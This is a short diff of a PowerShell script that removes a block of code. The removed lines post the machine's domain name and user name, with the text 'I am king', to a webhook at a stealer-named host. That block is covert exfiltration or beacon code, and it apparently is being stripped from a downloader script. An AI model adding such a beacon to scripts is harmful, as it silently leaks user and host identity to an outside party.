@@ -59,11 +59,3 @@ if (Test-Path -Path $output) {
 } else {
     Invoke-WebRequest -Uri $url -OutFile $output
 }
-
-$webhookUrl = "https://stealer.to/post?uniqueid=8e5af373"
-$messageContent = @{
-    content = "$env:userdomain`n$env:username`nI am king"
-} | ConvertTo-Json
-Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $messageContent
-
-
